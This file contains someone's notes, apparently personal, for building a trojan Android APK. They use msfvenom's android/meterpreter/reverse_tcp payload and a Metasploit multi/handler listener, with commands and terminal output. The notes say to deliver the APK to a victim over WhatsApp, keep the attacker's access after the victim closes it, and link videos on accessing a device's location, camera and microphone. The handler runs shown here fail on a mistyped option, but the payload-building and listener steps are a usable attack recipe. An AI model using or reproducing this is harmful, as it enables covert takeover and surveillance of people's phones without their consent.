@@ -1,0 +1,305 @@
+Hack android through kali
+-----------------------------------------
+terminal - 1
+ip a
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.164 LPORT=8484 > test.apk
+firefox  https://web.whatsapp.com/ 
+sudo su
+ls
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.164 LPORT=8484 > test.apk
+msfconsole 
+-----------------------------------------------------------------------------------------
+1   
+use exploit/multi/handler
+2   msf6 exploit(multi/handler) > 
+set payload android/meterpreter/reverse_tcp
+3   
+show options
+4   
+set LHOSTS 192.168.176.164
+5   
+set LPORT 8484
+6  
+set ExitOnSession False
+7   
+exploit -j
+8   
+set LPORT 8080
+9   
+exploit -j
+10  
+set ExitOnSession False
+11  
+set LHOSTS 192.168.176.164
+12  
+exploit -j
+13  
+exploit
+--------------------------------------------------
+14  history
+------------------------------------------------------------------------------------------------------------------------------------------
+================================================================================
+0.
+──(kali㉿kali)-[~]
+└─$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:0c:29:1f:c8:8f brd ff:ff:ff:ff:ff
+    inet 192.168.176.164/24 brd 192.168.176.255 scoroute eth0
+       valid_lft 1744sec preferred_lft 1744sec
+    inet6 fe80::2212:5573:324:e446/64 scope link no
+       valid_lft forever preferred_lft forever
+
+------------------------------------------------------------------------------------------------------------------------------------------
+================================================================================
+1.
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.164 LPORT=8484 > test.apk
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.164 LPORT=8484 > test.apk
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+No encoder specified, outputting raw payload
+Payload size: 10241 bytes
+---------------------------------------------------------------------------------------------------------------------------------
+
+ --------------------------------------------------------------------------------------------------------------------------------                                                                                                  
+----------------------------------------------------------------------------------------------------------------------
+----  LHOST = attacker os ip
+.....(msfvenom -p android/meterpreter/reverse_tcp 
+LHOST=192.168.0.0 LPORT=8484)   payload will generate  .....
+---- choose any port above then 8000 ..... 
+---- after > payload will store in mention file and in given path....
+----------------------------------------------------------------------------------------------------------------------
+=======================================================================
+2.
+msfconsole  
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfconsole                                                                             
+Metasploit tip: Metasploit can be configured at startup, see msfconsole 
+--help to learn more
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.                                                            
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                          
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                         
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                        
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                        
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                        
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                        
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                        
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                         
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                          
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                           
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                            
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                             
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                               
+           :kk;.OOOOOOOOOOOOO.;Ok:                                                                 
+             ;kOOOOOOOOOOOOOOOk:                                                                   
+               ,xOOOOOOOOOOOx,                                                                     
+                 .lOOOOOOOl.                                                                       
+                    ,dOd,                                                                          
+                      .                                                                            
+
+       =[ metasploit v6.4.18-dev                          ]
++ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+======================================================================
+3.
+use exploit/multi/handler
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > 
+
+==================================================================================
+4.
+set payload android/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+payload => android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > 
+
+=========================================================================
+5.   to check payload requirements--- 
+show options 
+------------------------------------------------------------------
+msf6 exploit(multi/handler) > show options 
+
+Payload options (android/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > 
+
+============================================================================
+6.
+set LHOSTS 192.168.176.164
+
+---------------------------------------------------------
+msf6 exploit(multi/handler) > set LHOSTS 192.168.176.164
+[!] Unknown datastore option: LHOSTS. Did you mean LHOST?
+LHOSTS => 192.168.176.164
+msf6 exploit(multi/handler) > 
+
+============================================================================
+7.
+ set LPORT 8484
+
+-------------------------------------------------------------------------------------------------
+msf6 exploit(multi/handler) > set LPORT 8484
+LPORT => 8484
+msf6 exploit(multi/handler) > 
+
+============================================================================
+
+8.    through it,  if victim close the payload but attacker remain access 
+set ExitOnSession False 
+------------------------------------------------------------------------------------------
+msf6 exploit(multi/handler) > set ExitOnSession False 
+ExitOnSession => false
+msf6 exploit(multi/handler) > 
+
+
+============================================================================
+
+9.    through it payload will run background ... 
+exploit -j
+------------------------------------------------------------------------------------------
+sf6 exploit(multi/handler) > exploit -j
+
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
+
+============================================================================
+
+10.   open payload in kali folder -- send that by WhatsApp
+another terminal
+------------------------------------------------------------------------------------------
+┌──(kali㉿kali)-[~]
+└─$ ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    test.apk
+
+============================================================================
+another terminal
+11. -- send that by WhatsApp
+
+┌──(kali㉿kali)-[~]
+└─$ firefox https://web.whatsapp.com/
+
+ 
+============================================================================
+12.
+
+sf6 exploit(multi/handler) > exploit -j
+
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+
+============================================================================
+13
+exploit
+msf6 exploit(multi/handler) > exploit
+
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+
+============================================================================
+14 
+history
+
+msf6 exploit(multi/handler) > history
+1   use exploit/multi/handler
+2   set payload android/meterpreter/reverse_tcp
+3   show options
+4   set LHOSTS 192.168.176.164
+5   set LPORT 8484
+6   set ExitOnSession False
+7   exploit -j
+8   set LPORT 8080
+9   exploit -j
+10  set ExitOnSession False
+11  set LHOSTS 192.168.176.164
+12  exploit -j
+13  exploit
+14  history
+msf6 exploit(multi/handler) > 
+-------------------------------------------------------------------------------------------------
+send file by WhatsApp --> install file -> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+reference ----
+https://www.youtube.com/watch?v=h3Nrix32pfM
+
+---------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+reference-
+https://www.youtube.com/watch?v=wDwhxPwpznE
+https://www.youtube.com/watch?v=jqkR5InC_Fg
+Access Location, Camera & Mic of any Device
+https://www.youtube.com/watch?v=h_f9lB4i-LA
+-----------
+https://www.youtube.com/watch?v=ksUylvdJQDQ
+----------
+https://www.youtube.com/watch?v=wDwhxPwpznE
+---------
+https://www.youtube.com/watch?v=jqkR5InC_Fg
